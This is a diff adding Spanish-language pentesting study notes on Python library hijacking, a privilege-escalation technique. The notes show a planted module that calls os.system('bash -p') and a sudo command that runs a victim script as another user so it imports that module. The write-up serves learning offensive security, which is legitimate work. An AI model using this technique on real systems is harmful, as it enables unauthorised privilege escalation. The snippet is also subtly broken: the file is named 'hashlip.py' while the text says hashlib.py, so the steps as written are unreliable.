@@ -10,3 +10,32 @@ Además, el atacante también puede crear su propia biblioteca en el directorio 
 
 
 ![](../../../attachments/Pasted%20image%2020260219123941.png)
+
+Teniendo uun script de python example.py en tmp con lo siguiente
+![](../../../attachments/Pasted%20image%2020260219124919.png)
+
+Pues podemos hacer un Python Library Hijacking basándonos en el principio de que python buscara la librería hashlib, y si la podemos crear en el mismo directorio del example.py pues este la leerá de aquí y no de la verdadera.
+
+```bash
+#Ver el path de python
+python3 -c 'import sys; print(sys.path)'
+```
+
+![](../../../attachments/Pasted%20image%2020260219125620.png)
+
+Pues nos creamos en /tmp un script hashlib.py
+```bash
+cd /tmp
+nano hashlip.py
+
+#Escribimos
+import os
+
+os.system("bash -p")
+
+#Cerramos y nos ejecutamos como manolito el example.py para ver si escalamos al usuario manolito
+
+sudo -u manolito python3 /tmp/example.py 
+```
+
+También tener en cuenta que si la librería se encuentra en uno de os últimos directorios del path de python y tenemos permisos de escritura en uno de los directorios anteriores también podíamos crear en este el hashlib.py y funcionaria de la misma manera ya que al igual que en el path del sistema se va buscando de izquierda a derecha hasta encontrar el ejecutable. Basta solo poder ponerlo en un lugar por delante de la librería original. Ocurre igual si podemos modificar una de estas librerias que llama el script
